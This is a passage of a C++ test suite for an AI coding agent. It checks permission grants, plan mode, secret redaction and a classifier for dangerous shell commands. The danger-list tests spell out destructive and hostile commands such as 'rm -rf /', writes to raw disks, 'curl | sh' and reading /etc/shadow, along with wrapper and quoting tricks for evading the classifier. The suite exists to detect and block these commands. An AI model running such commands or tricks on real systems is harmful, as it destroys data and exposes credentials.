    size_t oai_est = conv.estimate_tokens("openai");
    size_t gem_est = conv.estimate_tokens("gemini");
    check(oai_est > 0, "openai estimate is positive");
    check(gem_est > 0, "gemini estimate is positive");
    check(gem_est >= oai_est, "gemini SentencePiece yields >= token count on code");

    // 7. Message estimation and context trimming consistency
    agent::Message test_msg(agent::Role::USER, "const std::string text = \"hello world\";");
    size_t oai_msg_tok = agent::Conversation::estimate_message_tokens(test_msg, "openai");
    size_t gem_msg_tok = agent::Conversation::estimate_message_tokens(test_msg, "gemini");
    check(oai_msg_tok > 0, "oai message estimate positive");
    check(gem_msg_tok > 0, "gemini message estimate positive");
    check(gem_msg_tok >= oai_msg_tok, "gemini message tokens >= openai due to 3.5 chars/tok");
}

static void test_trust_grants() {
    std::cout << "trust: standing grants + revoke" << std::endl;
    using namespace agent::tools;
    Registry reg;
    reg.register_defaults();
    reg.set_mode(ConfirmMode::confirm);
    reg.set_strict(true);
    Decision give = Decision::session;
    reg.set_confirm_callback([&](const ConfirmRequest&, std::string&) { return give; });

    reg.execute("run_command", JSON::Object{ { "command", "echo one" } }); // grant session for "echo one"
    give = Decision::similar;
    reg.execute("run_command", JSON::Object{ { "command", "ls -a" } });    // grant similar for "ls"

    auto g = reg.grants();
    check(g.size() == 2, "two standing grants recorded");
    // The session grant auto-approves a repeat and bumps its use counter.
    reg.execute("run_command", JSON::Object{ { "command", "echo one" } });
    bool counted = false;
    for ( const auto& x : reg.grants())
        if ( x.kind == "session" && x.uses == 1 ) counted = true;
    check(counted, "grant use counter increments on auto-approval");

    // Revoke one, then all.
    std::string key = reg.grants()[0].key;
    check(reg.revoke_grant(key) == 1, "revoke_grant removes one");
    check(reg.grants().size() == 1, "one grant left");
    check(reg.revoke_all_grants() == 1, "revoke_all clears the rest");
    check(reg.grants().empty(), "no grants after revoke all");
}

// A benign `cd` prefix must never let an "allow all like this" grant wave through
// a compound's dangerous stage, and the grant must key on the real program.
static void test_compound_grant_safety() {
    std::cout << "safety: compound commands + allow-similar" << std::endl;
    using namespace agent::tools;
    Registry reg;
    reg.register_defaults();
    reg.set_mode(ConfirmMode::confirm);
    reg.set_strict(true); // so even "safe" commands are gated, isolating the grant logic
    int prompts = 0;
    Decision give = Decision::similar;
    reg.set_confirm_callback([&](const ConfirmRequest& rq, std::string&) {
        ++prompts;
        // A dangerous command must never offer the blanket "allow similar" option.
        if ( !rq.danger.empty()) check(!rq.can_similar, "no allow-similar on a dangerous command");
        return give;
    });

    // Grant "allow similar" from a benign `cd … && ls` — it must key on ls, not cd.
    reg.execute("run_command", JSON::Object{ { "command", "cd /usr/src && ls -a" } });
    check(prompts == 1, "first compound prompted");
    bool ls_keyed = false;
    for ( const auto& x : reg.grants()) if ( x.key == "ls" ) ls_keyed = true;
    check(ls_keyed, "allow-similar keyed on the real program (ls), not cd");

    // A later benign `cd … && ls` now auto-runs (ls is allowed) — no new prompt.
    reg.execute("run_command", JSON::Object{ { "command", "cd /tmp && ls -la" } });
    check(prompts == 1, "benign cd && ls auto-runs under the ls grant");

    // But a dangerous compound behind the SAME cd prefix must STILL prompt.
    give = Decision::deny;
    std::string r = reg.execute("run_command", JSON::Object{ { "command", "cd /tmp && rm -rf /" } });
    check(prompts == 2, "dangerous cd && rm -rf still prompts (not waved through by cd)");
    check(r.find("declined") != std::string::npos, "and can be denied");
}

static void test_plan_mode() {
    std::cout << "plan mode (read-only tools only)" << std::endl;
    using namespace agent::tools;
    Registry reg;
    reg.register_defaults();
    reg.set_mode(ConfirmMode::insecure);
    reg.set_plan_mode(true);

    std::string wf = "/tmp/ai_plan_test.txt";
    std::filesystem::remove(wf);
    std::string w = reg.execute("write_file", JSON::Object{ { "path", wf }, { "content", "x" } });
    check(w.find("plan mode is on") != std::string::npos, "write_file refused in plan mode");
    check(!std::filesystem::exists(wf), "no file created while planning");
    std::string rc = reg.execute("run_command", JSON::Object{ { "command", "echo hi" } });
    check(rc.find("plan mode is on") != std::string::npos, "run_command refused in plan mode");

    { std::ofstream o(wf); o << "hello\nworld\n"; }
    std::string rd = reg.execute("read_file", JSON::Object{ { "path", wf } });
    check(rd.find("hello") != std::string::npos, "read_file still works in plan mode");
    std::string ls = reg.execute("list_directory", JSON::Object{ { "path", "/tmp" } });
    check(ls.find("plan mode") == std::string::npos, "list_directory still works in plan mode");

    reg.set_plan_mode(false);
    std::string w2 = reg.execute("write_file", JSON::Object{ { "path", wf }, { "content", "y" } });
    check(w2.rfind("ok:", 0) == 0, "write_file works again after /plan off");
    std::filesystem::remove(wf);

    check(EditFile().mutates(), "edit_file marked mutating");
    check(!ReadFile().mutates(), "read_file marked read-only");
}

static void test_ask_continue() {
    std::cout << "per-turn tool budget (ask_continue)" << std::endl;
    using namespace agent::tools;
    { Registry r; check(!r.ask_continue("N calls"), "no callback -> stop"); }
    {
        Registry r;
        r.set_confirm_callback([](const ConfirmRequest& rq, std::string&) {
            check(rq.tool == "continue the turn", "asks about continuing the turn");
            check(!rq.can_similar, "no allow-similar option on the budget prompt");
            return Decision::once;
        });
        check(r.ask_continue("N calls"), "allow -> continue");
    }
    {
        Registry r;
        r.set_confirm_callback([](const ConfirmRequest&, std::string&) { return Decision::deny; });
        check(!r.ask_continue("N calls"), "deny -> stop");
    }
    {
        Registry r; r.set_mode(ConfirmMode::insecure);
        r.set_confirm_callback([](const ConfirmRequest&, std::string&) { return Decision::deny; });
        check(r.ask_continue("N calls"), "insecure -> always continue");
    }
}

static void test_deny_with_note() {
    std::cout << "deny with a note" << std::endl;
    using namespace agent::tools;
    Registry reg;
    reg.register_defaults();
    reg.set_mode(ConfirmMode::confirm);
    reg.set_strict(true);

    reg.set_confirm_callback([](const ConfirmRequest&, std::string& note) {
        note = "use /tmp for scratch files instead";
        return Decision::deny;
    });
    std::string r = reg.execute("run_command", JSON::Object{ { "command", "echo hi" } });
    check(r.find("declined") != std::string::npos, "still a decline");
    check(r.find("use /tmp for scratch files instead") != std::string::npos,
          "the reason reaches the tool result");

    reg.set_confirm_callback([](const ConfirmRequest&, std::string&) { return Decision::deny; });
    std::string r2 = reg.execute("run_command", JSON::Object{ { "command", "echo hi" } });
    check(r2.find("declined") != std::string::npos && r2.find(" — ") == std::string::npos,
          "a plain deny carries no reason");
}

static void test_turn_scoped_grant() {
    std::cout << "allow-for-the-rest-of-this-turn grant" << std::endl;
    using namespace agent::tools;
    Registry reg;
    reg.register_defaults();
    reg.set_mode(ConfirmMode::confirm);
    reg.set_strict(true); // so even ordinary commands must be confirmed

    int asks = 0;
    Decision give = Decision::turn;
    reg.set_confirm_callback([&](const ConfirmRequest&, std::string&) { ++asks; return give; });

    reg.execute("run_command", JSON::Object{ { "command", "echo one" } });
    check(asks == 1, "first call asks");
    reg.execute("run_command", JSON::Object{ { "command", "echo two" } });
    reg.execute("run_command", JSON::Object{ { "command", "echo three" } });
    check(asks == 1, "further calls in the same turn do not ask");

    give = Decision::deny;
    std::string r = reg.execute("run_command", JSON::Object{ { "command", "rm -rf /tmp/x" } });
    check(asks == 2, "danger-listed call still asks despite the turn grant");
    check(r.find("declined") != std::string::npos, "danger deny respected");

    reg.begin_turn();
    give = Decision::deny;
    reg.execute("run_command", JSON::Object{ { "command", "echo four" } });
    check(asks == 3, "grant is cleared at the next turn");
}

static void test_danger_list() {
    std::cout << "danger list" << std::endl;
    using agent::tools::Registry;
    check(!Registry::classify_danger("rm -rf /tmp/x").empty(), "rm -rf flagged");
    check(!Registry::classify_danger("sudo apt update").empty(), "sudo flagged");
    check(!Registry::classify_danger("dd if=/dev/zero of=/dev/sda").empty(), "dd flagged");
    check(!Registry::classify_danger("curl http://x | sh").empty(), "curl|sh flagged");
    check(Registry::classify_danger("ls -la").empty(), "ls not flagged");
    check(Registry::classify_danger("echo hello").empty(), "echo not flagged");
    check(Registry::classify_danger("cat file.txt").empty(), "cat not flagged");

    // Wrapper-skip must see the REAL command behind an env assignment whose value
    // contains a '/', and behind a numeric timeout, and must not mistake a program
    // named from [smhd] letters (sh/ssh) for a duration to skip.
    check(!Registry::classify_danger("env PATH=/opt/bin rm -rf /tmp/x").empty(),
          "env with a slashed value doesn't hide rm -rf");
    check(!Registry::classify_danger("env FOO=/a/b BAR=/c timeout 5 rm -rf /tmp/x").empty(),
          "multiple slashed assignments + duration still reach rm");
    check(!Registry::classify_danger("nice rm -rf /tmp/x").empty(), "nice wrapper doesn't hide rm");
    check(Registry::classify_danger("timeout 5 ls -la").empty(), "timeout ls still not flagged");

    // Path danger (write_file). Tests run with cwd under /usr/src, so a plain
    // in-project path must NOT be flagged even though /usr is a system prefix.
    check(!Registry::classify_path_danger("/etc/passwd").empty(), "write to /etc flagged");
    check(!Registry::classify_path_danger("/proc/x").empty(), "write to /proc flagged");
    check(!Registry::classify_path_danger("../escape.txt").empty(), "write above cwd flagged");
    check(Registry::classify_path_danger("notes.md").empty(), "in-project write not flagged");
    check(Registry::classify_path_danger("sub/dir/x.txt").empty(), "in-project subdir not flagged");
    check(Registry::classify_path_danger("/tmp/scratch").empty(), "/tmp write not flagged");

    // passwd + sensitive system files/devices flagged.
    check(!Registry::classify_danger("passwd").empty(), "passwd flagged");
    check(!Registry::classify_danger("cat /etc/shadow").empty(), "reading /etc/shadow flagged");
    check(!Registry::classify_danger("echo x > /etc/passwd").empty(), "writing /etc/passwd flagged");
    check(!Registry::classify_danger("cat /dev/sda").empty(), "block device flagged");

    // Flag criteria match whole tokens (paths/names must not trip option rules).
    check(!Registry::classify_danger("rm -rf /tmp/x").empty(), "rm -rf still flagged");
    check(Registry::classify_danger("rm dir/file").empty(), "rm of one file in a subdir not flagged");
    check(!Registry::classify_danger("chmod 777 x").empty(), "chmod 777 flagged");
    check(Registry::classify_danger("chmod 644 file777.txt").empty(), "chmod 644 with 777 in a name not flagged");

    // Wrapper commands must not smuggle a dangerous command past the classifier.
    check(!Registry::classify_danger("env FOO=bar rm -rf /tmp/x").empty(), "env-wrapped rm -rf flagged");
    check(!Registry::classify_danger("timeout 5 rm -rf /tmp/x").empty(), "timeout-wrapped rm -rf flagged");
    check(!Registry::classify_danger("sudo rm -rf /tmp/x").empty(), "sudo-wrapped rm -rf flagged");
    check(!Registry::classify_danger("nohup nice env X=1 rm -rf /tmp/x").empty(), "chained wrappers unwrapped");
    check(Registry::classify_danger("env FOO=bar ls").empty(), "env-wrapped ls still not flagged");

    // Compound commands: a dangerous stage after a benign prefix must be caught —
    // NOT judged by the leading `cd`/echo alone.
    check(!Registry::classify_danger("cd /tmp && rm -rf /").empty(), "cd && rm -rf flagged");
    check(!Registry::classify_danger("cd /usr/src; rm -rf x").empty(), "cd ; rm -rf flagged");
    check(!Registry::classify_danger("echo hi && dd if=/dev/zero of=/dev/sda").empty(), "echo && dd flagged");
    check(!Registry::classify_danger("ls | rm -rf /tmp/x").empty(), "piped rm -rf flagged");
    check(!Registry::classify_danger("make & rm -rf /tmp/x").empty(), "backgrounded prefix + rm -rf flagged");
    check(Registry::classify_danger("cd /tmp && ls -la").empty(), "cd && ls still not flagged");
    check(Registry::classify_danger("cd a && git log | grep x").empty(), "benign compound not flagged");

    // Wrapper option-VALUES must not hide the real command (the value is not a
    // program): timeout -s KILL 5 rm -rf / used to be classified as "KILL".
    check(!Registry::classify_danger("timeout -s KILL 5 rm -rf /").empty(), "timeout -s KILL 5 rm -rf flagged");
    check(!Registry::classify_danger("ionice -c best-effort rm -rf /tmp/x").empty(), "ionice -c value + rm flagged");
    // Command substitutions run their own commands.
    check(!Registry::classify_danger("echo $(rm -rf /)").empty(), "rm inside $() flagged");
    check(!Registry::classify_danger("x=`dd if=/dev/zero of=/dev/sda`").empty(), "dd inside backticks flagged");
    check(Registry::classify_danger("echo $(date)").empty(), "benign $() not flagged");
    // Quoting/escaping the program name must not bypass the classifier.
    check(!Registry::classify_danger("\"rm\" -rf /").empty(), "quoted rm flagged");
    check(!Registry::classify_danger("\\rm -rf /").empty(), "backslash-escaped rm flagged");
}

static void test_redact_secrets() {
    std::cout << "redact_secrets (mask credentials in tool output)" << std::endl;
    using agent::redact_secrets;
    int n = 0;

    auto redacted = [&](const std::string& s) { n = 0; std::string r = redact_secrets(s, n); return r; };

    check(redacted("key sk-abcdefghij0123456789ABCD").find("sk-abcdefg") == std::string::npos &&
          n == 1, "OpenAI sk- key masked");
    check(redacted("token=sk-ant-abcdefghij0123456789XYZ").find("sk-ant-abc") == std::string::npos,
          "Anthropic sk-ant- key masked");
    check(redacted("ghp_0123456789abcdefghijABCDEFGHIJ0123").find("ghp_0123") == std::string::npos,
          "GitHub token masked");
    check(redacted("key sk-proj-abcdefghij0123456789ABCDlonger").find("sk-proj-abc") == std::string::npos,
          "modern OpenAI sk-proj- key masked");
    check(redacted("AKIAIOSFODNN7EXAMPLE0").find("AKIAIOSF") == std::string::npos, "AWS key masked");
    check(redacted("Authorization: Bearer abcdefghijklmnop0123456789")
              .find("abcdefghijklmnop") == std::string::npos, "Bearer token masked");
    check(redacted("-----BEGIN RSA PRIVATE KEY-----\nMIIEabc\n-----END RSA PRIVATE KEY-----")
              == "[REDACTED PRIVATE KEY]", "PEM private key masked");
    check(redacted("API_KEY=supersecretvalue123").find("supersecretvalue") == std::string::npos,
          "labelled API_KEY= value masked");
    check(redacted("password: hunter2hunter2").find("hunter2") == std::string::npos,
          "labelled password: value masked");

    // Must NOT over-redact ordinary output.
    n = 0; redact_secrets("the quick brown fox jumps over the lazy dog", n);
    check(n == 0, "prose untouched");
    n = 0; redact_secrets("commit a1b2c3d4e5f6a7b8c9d0 fixed the bug", n);
    check(n == 0, "a git hash is not treated as a secret");
    n = 0; redact_secrets("API_KEY=your_key_here", n);
    check(n == 0, "placeholder value left alone");
    n = 0; redact_secrets("ls -la /home/user", n);
    check(n == 0, "a plain command is untouched");
    // A label at the end of a line must not bind to an identifier on the NEXT
    // line: a `? "..._API_KEY" :\n <code>` ternary is source, not a secret.
    n = 0;
    redact_secrets("v = cond ? \"OPENAI_API_KEY\" :\n    other == \"x\" ? \"y\" : nullptr;", n);
    check(n == 0, "a line-end label does not redact the next line's code (ternary)");

    // Regression (stack overflow): the libstdc++ matcher recurses per character of
    // a quantified run, so a very long unbroken token used to blow the stack —
    // fatally on musl's small default THREAD stacks (the tool-result path runs on
    // a worker thread). Input is now processed in bounded spans; run the worst
    // case on a real thread like production does.
    {
        std::string big = "log: Bearer " + std::string(200000, 'a') + "\ntail line";
        int tn = 0;
        std::string tr;
        std::thread t([&]() { tr = redact_secrets(big, tn); });
        t.join();
        check(tn >= 1 && tr.find("Bearer [REDACTED]") != std::string::npos &&
              tr.find("tail line") != std::string::npos,
              "a 200k unbroken token redacts on a worker thread (no stack overflow)");
    }
    n = 0;
    std::string chunked = redact_secrets(
        "a\nkey sk-abcdefghij0123456789ABCD\n" + std::string(20000, 'x') +
        "\npassword: hunter2secret\n", n);
    check(n == 2 && chunked.find("sk-abcdefg") == std::string::npos &&
          chunked.find("hunter2secret") == std::string::npos,
          "secrets on both sides of a chunk boundary are still masked");
}

static void test_session_names() {
    std::cout << "named parallel sessions (filename-safe names)" << std::endl;
    using agent::Config;
    check(Config::sanitize_session_name("").empty(), "an empty name is the default session");
    check(Config::sanitize_session_name("  default ").empty(), "\"default\" normalises to the default session");
    check(Config::sanitize_session_name("DEFAULT").empty(), "\"default\" is matched case-insensitively");
    check(Config::sanitize_session_name("review") == "review", "a plain name passes through");
    check(Config::sanitize_session_name("feature_2-b") == "feature_2-b", "'-' and '_' are kept");
    check(Config::sanitize_session_name("../../etc/passwd") == "etc-passwd",
          "path separators and dots cannot escape the conversations dir");
    check(Config::sanitize_session_name("a b/c") == "a-b-c", "unsafe characters become '-'");
    check(Config::sanitize_session_name("--edge--") == "edge", "leading/trailing separators are trimmed");
    check(Config::sanitize_session_name("...").empty(), "a name of only unsafe characters becomes the default");
    check(Config::sanitize_session_name(std::string(80, 'x')).size() == 48, "long names are capped");
}

static void test_markdown_formatting() {
    std::cout << "markdown formatting (lists, tasks, links)" << std::endl;
    agent::SyntaxHighlighter hl{ 1 };
    auto joined = [](const std::vector<agent::StyledSpan>& spans) {
        std::string s;
        for ( const auto& sp : spans ) s += sp.text;
        return s;
    };
    auto has_underline = [](const std::vector<agent::StyledSpan>& spans) {
        for ( const auto& sp : spans ) if ( sp.underline ) return true;
        return false;
    };

    auto l1 = hl.highlight("- item", agent::Language::markdown);
    check(joined(l1) == "- item" && !l1.empty() && l1[0].color_pair == hl.color_for_keyword(), "bullet list marker is highlighted");
    auto l2 = hl.highlight("1. item", agent::Language::markdown);
    check(joined(l2) == "1. item" && !l2.empty() && l2[0].color_pair == hl.color_for_keyword(), "numbered list marker is highlighted");
    auto t1 = hl.highlight("- [ ] todo", agent::Language::markdown);
    check(joined(t1) == "- [ ] todo" && has_underline(t1), "task checkbox is underlined");
    auto t2 = hl.highlight("- [x] done", agent::Language::markdown);
    check(joined(t2) == "- [x] done" && has_underline(t2), "completed task checkbox is underlined");
    auto lk = hl.highlight("see [docs](https://example.com) for details", agent::Language::markdown);
    check(joined(lk) == "see [docs](https://example.com) for details" && has_underline(lk), "markdown links are underlined like copyable text");
    auto em = hl.highlight("**bold** and _italic_", agent::Language::markdown);
    check(joined(em) == "**bold** and _italic_", "existing emphasis still passes through");
}


static void test_stale_read_guard() {
    std::cout << "stale-read guard (no silent clobber of a changed file)" << std::endl;
    using namespace agent::tools;
    Registry reg;
    reg.register_defaults();
    reg.set_mode(ConfirmMode::insecure); // isolate the guard from confirmation
    std::string path = "/tmp/ai_stale_guard.txt";
    { std::ofstream o(path); o << "original contents\n"; }

    // A blind write to a never-read file is allowed (creating/replacing knowingly).
    std::string neww = "/tmp/ai_stale_new.txt";
    std::filesystem::remove(neww);
    check(reg.execute("write_file", JSON::Object{ { "path", neww }, { "content", "x" } }).rfind("ok:", 0) == 0,
          "write to a never-read file is allowed");

    // Read the file (stamps it), then change it on disk behind the model's back.
    reg.execute("read_file", JSON::Object{ { "path", path } });
    { std::ofstream o(path); o << "changed on disk by someone else, more bytes\n"; }

    std::string r = reg.execute("write_file", JSON::Object{ { "path", path }, { "content", "clobber" } });
    check(r.find("changed on disk") != std::string::npos, "write refused after external change");
    std::string e = reg.execute("edit_file",
        JSON::Object{ { "path", path }, { "old_string", "changed" }, { "new_string", "z" } });
    check(e.find("changed on disk") != std::string::npos, "edit refused after external change");

    // The file is untouched by the refused write.
    { std::ifstream i(path); std::string s((std::istreambuf_iterator<char>(i)), {});
      check(s.find("changed on disk by someone else") != std::string::npos, "refused write left the file intact"); }

    // Re-reading re-stamps it; the write then goes through.
    reg.execute("read_file", JSON::Object{ { "path", path } });
    check(reg.execute("write_file", JSON::Object{ { "path", path }, { "content", "ok now" } }).rfind("ok:", 0) == 0,
          "write succeeds after a fresh read");
    std::filesystem::remove(path);
    std::filesystem::remove(neww);
}

static void test_list_directory() {
    std::cout << "list_directory (sorted, dirs first, error_code)" << std::endl;
    std::string d = "/tmp/ai_ld_test";
    std::filesystem::remove_all(d);
    std::filesystem::create_directories(d + "/zsub");
    { std::ofstream o(d + "/afile.txt"); o << "x"; }
    { std::ofstream o(d + "/bfile.txt"); o << "y"; }
    agent::tools::ListDirectory ld;
    std::string r = ld.execute(JSON::Object{ { "path", d } });
    size_t pdir = r.find("[dir]  zsub");
    size_t pa = r.find("[file] afile.txt");
    check(pdir != std::string::npos && pa != std::string::npos && pdir < pa, "directories sorted before files");
    check(r.find("[file] afile.txt") < r.find("[file] bfile.txt"), "files sorted alphabetically");
    std::string rf = ld.execute(JSON::Object{ { "path", d + "/afile.txt" } });
    check(rf.rfind("error:", 0) == 0, "a regular-file path returns an error, not a throw");
    std::filesystem::remove_all(d);
}

static void test_config_booleans() {
    std::cout << "config boolean parsing (accepts 'on')" << std::endl;
    std::string p = "/tmp/ai_cfg_bool";
    { std::ofstream o(p); o << "advisor: on\nauto_compact: on\nstrict: on\n"; }
    agent::Config c;
    c.load(p);
    check(c.advisor, "advisor: on -> true");
    check(c.auto_compact, "auto_compact: on -> true");
    check(c.strict, "strict: on -> true");
    std::filesystem::remove(p);
}

static void test_extra_command_lists() {
    std::cout << "config-extensible safe/danger command lists" << std::endl;
    using agent::tools::Registry;

    // Config parses the comma-separated lists.
    std::string p = "/tmp/ai_lists_cfg";
    { std::ofstream o(p); o << "tools_safe: mytool, jq\ntools_danger: deploy , terraform\n"; }
    agent::Config c;
    c.load(p);
    check(c.tools_safe.size() == 2 && c.tools_safe[0] == "mytool", "tools_safe parsed");
    check(c.tools_danger.size() == 2 && c.tools_danger[1] == "terraform", "tools_danger parsed");
    std::filesystem::remove(p);

    Registry::set_extra_safe(c.tools_safe);
    Registry::set_extra_danger(c.tools_danger);

    check(Registry::classify_danger("deploy production").rfind("flagged as dangerous", 0) == 0,
          "extra danger command flagged");
    check(!Registry::classify_danger("env FOO=1 terraform apply").empty(),
          "wrapped extra danger command flagged");
    check(Registry::classify_danger("mytool --version").empty(), "extra safe command not flagged as danger");
    check(Registry::classify_danger("ls -la").empty(), "builtin behaviour unchanged");

    // The safe side: an extra-safe command skips confirmation (classify_safe),
    // also inside pipes/chains; unknown commands still don't.
    check(Registry::classify_safe("mytool --check"), "extra safe command classified safe");
    check(Registry::classify_safe("cat data.json | jq .name"), "extra safe command safe in a pipe");
    check(!Registry::classify_safe("othertool --check"), "unlisted command still not safe");

    // Danger wins if a name is on both lists.
    Registry::set_extra_safe({ "deploy" });
    check(!Registry::classify_danger("deploy now").empty(), "danger wins over safe");
    check(!Registry::classify_safe("deploy now"), "danger-listed command never classified safe");

    // Reset so later tests see the defaults.
    Registry::set_extra_safe({});
    Registry::set_extra_danger({});
    check(Registry::classify_danger("deploy production").empty(), "reset restores defaults");
    check(!Registry::classify_safe("mytool --check"), "reset removes extra safe entries");
}

static void test_safe_commands() {
    std::cout << "safe command list" << std::endl;
    using agent::tools::Registry;
    // Read-only / side-effect-free commands.
    check(Registry::classify_safe("ls -la"), "ls safe");
    check(Registry::classify_safe("pwd"), "pwd safe");
    check(Registry::classify_safe("git status"), "git status safe");
    check(Registry::classify_safe("git log --oneline"), "git log safe");
    check(Registry::classify_safe("git branch"), "git branch (list) safe");
    check(Registry::classify_safe("gcc -v"), "gcc -v safe");
    check(Registry::classify_safe("g++ --version"), "g++ --version safe");
    check(Registry::classify_safe("make -n install"), "make -n safe");
    check(Registry::classify_safe("cmake --version"), "cmake --version safe");
    check(Registry::classify_safe("pkg-config --exists zlib"), "pkg-config safe");
    check(Registry::classify_safe("cat notes.md"), "cat (no redirect) safe");

    // Not safe: executes code, writes, or mutates.
    check(!Registry::classify_safe("rm file"), "rm not safe");
    check(!Registry::classify_safe("make"), "bare make not safe");
    check(!Registry::classify_safe("make install"), "make install not safe");
    check(!Registry::classify_safe("gcc main.c -o app"), "gcc compile not safe");
    check(!Registry::classify_safe("git branch newbranch"), "git branch create not safe");
    check(!Registry::classify_safe("git checkout main"), "git checkout not safe");
    check(!Registry::classify_safe("echo hi > f"), "redirection not safe");
    check(!Registry::classify_safe("ls | sh"), "pipe not safe");
    check(!Registry::classify_safe("tail -f log"), "tail -f not safe");

    // Chained safe commands.
    check(Registry::classify_safe("cd /usr/src/AIAgent && git log"), "cd && git log safe");
    check(Registry::classify_safe("git log | grep fix"), "git log | grep safe");
    check(Registry::classify_safe("ls; pwd"), "ls; pwd safe");
    check(!Registry::classify_safe("cd /tmp && rm x"), "chain with rm not safe");
    check(!Registry::classify_safe("ls && echo hi > f"), "chain with redirect not safe");
    check(!Registry::classify_safe("git log | sh"), "pipe to sh not safe");
    check(!Registry::classify_safe("sleep 5 &"), "background job not safe");
}

int main() {
    std::cout << "Running AI Agent test suite\n" << std::endl;

    test_conversation_save_load();
    test_conversation_undo();
    test_context_budget();
    test_trim_role_invariants();
    test_tool_supersession();
    test_tool_supersession_extended();
    test_large_tool_result_elision();
    test_trim_hysteresis();
    test_settings_persistence();
    test_context_auto();
    test_token_formatting();
    test_budget_persistence();
    test_compaction_budget();
    test_auto_compact();
    test_output_cap();
    test_rate_limit_parsing();
    test_context_defaults();
    test_model_resolution();
    test_1m_context_header();
    test_conversation_corrupt();
    test_expand_tilde();
    test_memory_loading();
    test_memory_listing();
    test_openai_request();
    test_codex_provider();
    test_gemini_provider();
    test_gemini_tool_calls_and_continuation();
    test_reasoning_content();
    test_reasoning_effort();
    test_openrouter_provider();
    test_ollama_request();
    test_anthropic_request();
    test_cached_token_accounting();
    test_max_tokens_and_truncation();
    test_thinking_block_replay();
    test_prompt_caching();
    test_anthropic_role_merge();
    test_kimi_thinking_effort();
    test_anthropic_thinking();
    test_provider_capabilities();
    test_advisor_tool();
    test_mcp_annotations_policy();
    test_mcp_tool_and_config();
    test_html_to_text();
    test_stream_sanitizer();
    test_web_search_parse();
    test_find_symbol();
    test_skills();
    test_tasks_tool();
    test_file_mentions();
    test_ultra_keyword();
    test_block_diff();
    test_outline_file();
    test_write_preview_cap();
    test_credential_perms();
    test_fetch_url_ssrf();
    test_commands_catalog();
    test_gitignore();
    test_gitignore_integration();
    test_project_map();
    test_find_references();
    test_pricing_and_cost();
    test_project_instructions();
    test_workflow_manager();
    test_workflow_tool();
    test_workflow_autoresume();
    test_tool_mode_persistence();
    test_workflow_parallel_cancel_retry();
    test_provider_options_config();
    test_claude_provider();
    test_claude_pkce();
    test_stream_parsers();
    test_stream_tool_calls();
    test_tools();
    test_tool_groups();
    test_tool_profiles();
    test_mcp_server_toggle();
    test_run_command_robustness();
    test_read_file_robustness();
    test_parallel_tool_safety();
    test_run_command_options();
    test_edit_file();
    test_workflows_menu();
    test_themes();
    test_confirm_danger_bell();
    test_grep_robustness();
    test_token_usage();
    test_provider_aware_token_accounting();
    test_trust_grants();
    test_compound_grant_safety();
    test_plan_mode();
    test_ask_continue();
    test_deny_with_note();
    test_turn_scoped_grant();
    test_danger_list();
    test_redact_secrets();
    test_session_names();
    test_markdown_formatting();
    test_stale_read_guard();
    test_list_directory();
    test_config_booleans();
    test_extra_command_lists();
    test_safe_commands();

    std::cout << "\n" << passed << " passed, " << failed << " failed" << std::endl;
    return failed > 0 ? 1 : 0;
}
